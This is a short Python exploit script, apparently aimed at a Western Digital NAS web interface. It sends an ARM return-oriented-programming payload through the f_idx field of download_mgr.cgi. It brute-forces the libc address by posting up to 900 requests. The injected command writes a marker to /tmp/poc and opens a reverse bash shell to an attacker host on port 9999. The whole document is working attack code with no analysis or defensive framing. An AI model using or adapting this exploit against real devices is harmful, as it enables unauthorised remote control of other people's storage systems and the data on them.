from pwn import *
import requests, time

libc = 0xb6900000 # necessary to brute force (success rate : 1/300)
popenGadget = 0x0014C8C
g2 = libc + 0x5f18c
g1 = libc + 0x26e24

payload = "a"*0x10c
payload += p32(g1)
payload += p32(popenGadget+0x01000000) # r1
payload += p32(0xffffffff) # r3
payload += p32(0x011fffff) # r5
payload += p32(0xdeadbeef) # r6
payload += p32(0x02ffffff) # r7
payload += p32(0xdeadbeef) # r8
payload += p32(0xdeadbeef) # r12
payload += p32(0xdeadbeef) # lr
payload += p32(g2) # pc
payload += "echo ddd >> /tmp/poc;bash -c \"bash -i >& /dev/tcp/[HOST]/9999 0>&1\";#"

cookie = 'PHPSESSID=?; local_login=1; WD-CSRF-TOKEN=?'
csrfToken = cookie.split("WD-CSRF-TOKEN=")[1].split(";")[0]

s = requests.Session()

headers = {"Cookie": cookie,
"X-CSRF-Token": csrfToken}

url = "http://[HOST]/cgi-bin/download_mgr.cgi"
data = {"cmd":"Downloads_Schedule_Info",
        "f_idx":payload,
        "f_login_user":"test"}

for i in range(900):
  res = s.post(url, data = data, headers=headers)
  print "[%d] %d tried" % (res.status_code, i)
